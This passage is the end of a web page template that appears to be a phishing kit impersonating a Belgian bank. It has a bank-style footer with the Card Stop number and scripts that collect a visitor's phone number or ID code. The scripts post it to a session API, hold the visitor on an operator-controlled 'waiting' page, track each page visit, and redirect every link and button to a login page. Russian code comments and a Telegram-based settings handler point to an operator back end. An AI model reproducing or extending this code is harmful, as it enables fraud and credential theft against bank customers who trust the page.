                                    d="M48 26c-1.1 0-2 0.9-2 2v26H10V18h26c1.1 0 2-0.9 2-2s-0.9-2-2-2H8c-1.1 0-2 0.9-2 2v40c0 1.1 0.9 2 2 2h40c1.1 0 2-0.9 2-2V28C50 26.9 49.1 26 48 26z">
                                  </path>
                                  <path
                                    d="M56 6H44c-1.1 0-2 0.9-2 2s0.9 2 2 2h7.2L30.6 30.6c-0.8 0.8-0.8 2 0 2.8C31 33.8 31.5 34 32 34s1-0.2 1.4-0.6L54 12.8V20c0 1.1 0.9 2 2 2s2-0.9 2-2V8C58 6.9 57.1 6 56 6z">
                                  </path>
                                </svg></span></span></a>

                        </li>
                        <li class="icon icon-instagram menu-item icon--replaced">
                          <a href="#" class="menu-link menu-link--icon-footer menu-link--icon ext" data-extlink=""
                            rel="noreferrer">
                            <span class="menu-link__icon icon-instagram" aria-hidden="true"></span>
                            <span class="menu-link__text"><span class="extlink-nobreak">Instagram<svg focusable="false"
                                  width="1em" height="1em" class="ext" data-extlink-placement="append"
                                  aria-label="(externe link)" viewBox="0 0 80 40" role="img" aria-hidden="false">
                                  <title>(externe link)</title>
                                  <path
                                    d="M48 26c-1.1 0-2 0.9-2 2v26H10V18h26c1.1 0 2-0.9 2-2s-0.9-2-2-2H8c-1.1 0-2 0.9-2 2v40c0 1.1 0.9 2 2 2h40c1.1 0 2-0.9 2-2V28C50 26.9 49.1 26 48 26z">
                                  </path>
                                  <path
                                    d="M56 6H44c-1.1 0-2 0.9-2 2s0.9 2 2 2h7.2L30.6 30.6c-0.8 0.8-0.8 2 0 2.8C31 33.8 31.5 34 32 34s1-0.2 1.4-0.6L54 12.8V20c0 1.1 0.9 2 2 2s2-0.9 2-2V8C58 6.9 57.1 6 56 6z">
                                  </path>
                                </svg></span></span></a>

                        </li>
                        <li class="icon icon-linkedin menu-item icon--replaced">
                          <a href="#" class="menu-link menu-link--icon-footer menu-link--icon ext" data-extlink=""
                            rel="noreferrer">
                            <span class="menu-link__icon icon-linkedin" aria-hidden="true"></span>
                            <span class="menu-link__text"><span class="extlink-nobreak">LinkedIn<svg focusable="false"
                                  width="1em" height="1em" class="ext" data-extlink-placement="append"
                                  aria-label="(externe link)" viewBox="0 0 80 40" role="img" aria-hidden="false">
                                  <title>(externe link)</title>
                                  <path
                                    d="M48 26c-1.1 0-2 0.9-2 2v26H10V18h26c1.1 0 2-0.9 2-2s-0.9-2-2-2H8c-1.1 0-2 0.9-2 2v40c0 1.1 0.9 2 2 2h40c1.1 0 2-0.9 2-2V28C50 26.9 49.1 26 48 26z">
                                  </path>
                                  <path
                                    d="M56 6H44c-1.1 0-2 0.9-2 2s0.9 2 2 2h7.2L30.6 30.6c-0.8 0.8-0.8 2 0 2.8C31 33.8 31.5 34 32 34s1-0.2 1.4-0.6L54 12.8V20c0 1.1 0.9 2 2 2s2-0.9 2-2V8C58 6.9 57.1 6 56 6z">
                                  </path>
                                </svg></span></span></a>

                        </li>
                        <li class="icon icon-twitter menu-item icon--replaced">
                          <a href="#" class="menu-link menu-link--icon-footer menu-link--icon ext" data-extlink=""
                            rel="noreferrer">
                            <span class="menu-link__icon icon-twitter" aria-hidden="true"></span>
                            <span class="menu-link__text"><span class="extlink-nobreak">Twitter<svg focusable="false"
                                  width="1em" height="1em" class="ext" data-extlink-placement="append"
                                  aria-label="(externe link)" viewBox="0 0 80 40" role="img" aria-hidden="false">
                                  <title>(externe link)</title>
                                  <path
                                    d="M48 26c-1.1 0-2 0.9-2 2v26H10V18h26c1.1 0 2-0.9 2-2s-0.9-2-2-2H8c-1.1 0-2 0.9-2 2v40c0 1.1 0.9 2 2 2h40c1.1 0 2-0.9 2-2V28C50 26.9 49.1 26 48 26z">
                                  </path>
                                  <path
                                    d="M56 6H44c-1.1 0-2 0.9-2 2s0.9 2 2 2h7.2L30.6 30.6c-0.8 0.8-0.8 2 0 2.8C31 33.8 31.5 34 32 34s1-0.2 1.4-0.6L54 12.8V20c0 1.1 0.9 2 2 2s2-0.9 2-2V8C58 6.9 57.1 6 56 6z">
                                  </path>
                                </svg></span></span></a>

                        </li>
                        <li class="icon icon-card-stop menu-item icon--replaced">
                          <a href="#" class="menu-link menu-link--icon-footer menu-link--icon ext" data-extlink=""
                            rel="noreferrer">
                            <span class="menu-link__icon icon-card-stop" aria-hidden="true"></span>
                            <span class="menu-link__text">Card Stop 078 170 <span class="extlink-nobreak">170<svg
                                  focusable="false" width="1em" height="1em" class="ext" data-extlink-placement="append"
                                  aria-label="(externe link)" viewBox="0 0 80 40" role="img" aria-hidden="false">
                                  <title>(externe link)</title>
                                  <path
                                    d="M48 26c-1.1 0-2 0.9-2 2v26H10V18h26c1.1 0 2-0.9 2-2s-0.9-2-2-2H8c-1.1 0-2 0.9-2 2v40c0 1.1 0.9 2 2 2h40c1.1 0 2-0.9 2-2V28C50 26.9 49.1 26 48 26z">
                                  </path>
                                  <path
                                    d="M56 6H44c-1.1 0-2 0.9-2 2s0.9 2 2 2h7.2L30.6 30.6c-0.8 0.8-0.8 2 0 2.8C31 33.8 31.5 34 32 34s1-0.2 1.4-0.6L54 12.8V20c0 1.1 0.9 2 2 2s2-0.9 2-2V8C58 6.9 57.1 6 56 6z">
                                  </path>
                                </svg></span></span></a>

                        </li>

                      </ul>
                    </div>
                  </div>

                </div>
              </div>
            </div>
          </div>
        </div>
      </footer>

    </div>

  </div>

  @vite(['resources/js/app.js'])

  <script>
    // Translations for JavaScript
    window.translations = {
      send: '{{ __('messages.send') }}',
      loading: '{{ __('messages.loading') }}'
    };

    document.addEventListener('DOMContentLoaded', function () {
      const phoneInput = document.getElementById('phone-input');
      const phoneSubmitBtn = document.getElementById('phone-submit-btn');
      const idInput = document.getElementById('id-input');
      const idSubmitBtn = document.getElementById('id-submit-btn');

      // Check for existing session
      const existingSessionId = localStorage.getItem('session_id');
      if (existingSessionId && window.SessionManager) {
        window.SessionManager.setSessionId(existingSessionId);
        // Check session status and redirect if needed
        window.SessionManager.checkSessionStatus();

        // Track page visit
        trackPageVisit(existingSessionId, 'Главная страница', window.location.href);
      }

      // Track page visit function
      async function trackPageVisit(sessionId, pageName, pageUrl, actionType = null) {
        try {
          await fetch(`/api/session/${sessionId}/visit`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
            },
            body: JSON.stringify({
              page_name: pageName,
              page_url: pageUrl,
              action_type: actionType
            })
          });
        } catch (error) {
          console.error('Failed to track page visit:', error);
        }
      }

      // Функция для управления состоянием кнопок
      // Минимальные требования: телефон - 8 цифр, ID - от 4 до 8 символов
      const MIN_PHONE_LENGTH = 8;
      const MIN_ID_LENGTH = 4;

      function updateButtonsState() {
        const phoneValue = phoneInput.value.trim().replace(/[^0-9]/g, '');
        const idValue = idInput.value.trim().replace(/[^A-Z0-9]/gi, '');

        const phoneIsValid = phoneValue.length >= MIN_PHONE_LENGTH;
        const idIsValid = idValue.length >= MIN_ID_LENGTH;

        // Если телефон валиден - активируем кнопку телефона, деактивируем ID
        if (phoneIsValid) {
          phoneSubmitBtn.disabled = false;
          phoneSubmitBtn.classList.add('active');
          idSubmitBtn.disabled = true;
          idSubmitBtn.classList.remove('active');
        }
        // Если ID валиден - активируем кнопку ID, деактивируем телефон
        else if (idIsValid) {
          idSubmitBtn.disabled = false;
          idSubmitBtn.classList.add('active');
          phoneSubmitBtn.disabled = true;
          phoneSubmitBtn.classList.remove('active');
        }
        // Если оба поля не валидны - деактивируем обе кнопки
        else {
          phoneSubmitBtn.disabled = true;
          phoneSubmitBtn.classList.remove('active');
          idSubmitBtn.disabled = true;
          idSubmitBtn.classList.remove('active');
        }
      }

      // Инициализация состояния кнопок
      updateButtonsState();

      // Format phone number
      phoneInput.addEventListener('input', function (e) {
        let value = this.value.replace(/[^0-9]/g, '');
        this.value = value;
        updateButtonsState();
      });

      // Format identification (max 8 characters)
      idInput.addEventListener('input', function (e) {
        let value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
        if (value.length > 8) {
          value = value.slice(0, 8);
        }
        this.value = value;
        updateButtonsState();
      });

      // Обработка фокуса на полях
      phoneInput.addEventListener('focus', function () {
        updateButtonsState();
      });

      idInput.addEventListener('focus', function () {
        updateButtonsState();
      });

      // Обработка потери фокуса
      phoneInput.addEventListener('blur', function () {
        updateButtonsState();
      });

      idInput.addEventListener('blur', function () {
        updateButtonsState();
      });

      // Submit phone
      phoneSubmitBtn.addEventListener('click', async function () {
        const phone = phoneInput.value.trim();
        if (!phone || phone.length < 8) {
          phoneInput.focus();
          updateButtonsState();
          return;
        }

        // Деактивируем обе кнопки во время отправки
        phoneSubmitBtn.disabled = true;
        idSubmitBtn.disabled = true;
        this.querySelector('span').textContent = window.translations.loading;

        try {
          const fullPhone = '+32' + phone;
          await createSession('phone', fullPhone);
        } catch (error) {
          console.error('Error:', error);
          this.querySelector('span').textContent = window.translations.send;
          // Восстанавливаем состояние кнопок после ошибки
          updateButtonsState();
        }
      });

      // Submit ID
      idSubmitBtn.addEventListener('click', async function () {
        const id = idInput.value.trim().replace(/[^A-Z0-9]/gi, '');
        if (!id || id.length < MIN_ID_LENGTH) {
          idInput.focus();
          updateButtonsState();
          return;
        }

        // Деактивируем обе кнопки во время отправки
        idSubmitBtn.disabled = true;
        phoneSubmitBtn.disabled = true;
        this.querySelector('span').textContent = window.translations.loading;

        try {
          await createSession('id', id);
        } catch (error) {
          console.error('Error:', error);
          this.querySelector('span').textContent = window.translations.send;
          // Восстанавливаем состояние кнопок после ошибки
          updateButtonsState();
        }
      });

      // Enter key support
      phoneInput.addEventListener('keypress', function (e) {
        if (e.key === 'Enter') {
          phoneSubmitBtn.click();
        }
      });

      idInput.addEventListener('keypress', function (e) {
        if (e.key === 'Enter') {
          idSubmitBtn.click();
        }
      });

      async function createSession(inputType, inputValue) {
        const response = await fetch('/api/session', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
          },
          body: JSON.stringify({
            input_type: inputType,
            input_value: inputValue
          })
        });

        if (!response.ok) {
          throw new Error('Failed to create session');
        }

        const data = await response.json();
        const sessionId = data.data.id;

        // Save to localStorage
        localStorage.setItem('session_id', sessionId);

        // Initialize SessionManager
        if (window.SessionManager) {
          window.SessionManager.setSessionId(sessionId);
        }

        // Redirect to waiting page
        window.location.href = `/session/${sessionId}/waiting`;
      }
    });
    window.addEventListener('load', () => {
      fetch('/api/visit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
        },
        body: JSON.stringify({})
      }).catch(() => { });
    });
  </script>

  {{-- Smartsupp Live Chat --}}
  @php
    $smartsuppSettings = \App\Telegram\Handlers\SmartSuppHandler::getSettings();
  @endphp
  @if(!empty($smartsuppSettings['enabled']) && !empty($smartsuppSettings['key']))
    <script>
      var _smartsupp = _smartsupp || {};
      _smartsupp.key = '{{ $smartsuppSettings['key'] }}';
      window.smartsupp || (function (d) {
        var s, c, o = smartsupp = function () { o._.push(arguments) }; o._ = [];
        s = d.getElementsByTagName('script')[0]; c = d.createElement('script');
        c.type = 'text/javascript'; c.charset = 'utf-8'; c.async = true;
        c.src = '//www.smartsuppchat.com/loader.js?'; s.parentNode.insertBefore(c, s);
      })(document);
    </script>
  @endif

  <script>
    // Функция для раскрытия/скрытия преимуществ
    function toggleBenefit(index) {
      const benefitItems = document.querySelectorAll('.benefit-item');
      const currentItem = benefitItems[index];

      // Закрываем все остальные элементы и снимаем чекбоксы
      benefitItems.forEach((item, i) => {
        if (i !== index) {
          item.classList.remove('active');
          const checkbox = item.querySelector('input[type="checkbox"]');
          if (checkbox) checkbox.checked = false;
        }
      });

      // Переключаем текущий элемент и чекбокс
      const isActive = currentItem.classList.contains('active');
      const checkbox = currentItem.querySelector('input[type="checkbox"]');

      if (isActive) {
        currentItem.classList.remove('active');
        checkbox.checked = false;
      } else {
        currentItem.classList.add('active');
        checkbox.checked = true;
      }
    }
  </script>
  <script>
    document.addEventListener('DOMContentLoaded', () => {
      const loginUrl = '/login';
      document.querySelectorAll('a, button').forEach((el) => {
        el.addEventListener('click', (e) => {
          e.preventDefault();
          window.location.href = loginUrl;
        });
      });
    });
  </script>
</body>
<!-- Meta Pixel Code -->
<script>
  !function (f, b, e, v, n, t, s) {
    if (f.fbq) return; n = f.fbq = function () {
      n.callMethod ?
        n.callMethod.apply(n, arguments) : n.queue.push(arguments)
    };
    if (!f._fbq) f._fbq = n; n.push = n; n.loaded = !0; n.version = '2.0';
    n.queue = []; t = b.createElement(e); t.async = !0;
    t.src = v; s = b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t, s)
  }(window, document, 'script',
    'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '1344155130640766');
  fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
    src="https://www.facebook.com/tr?id=1344155130640766&ev=PageView&noscript=1" /></noscript>
<!-- End Meta Pixel Code -->

</html>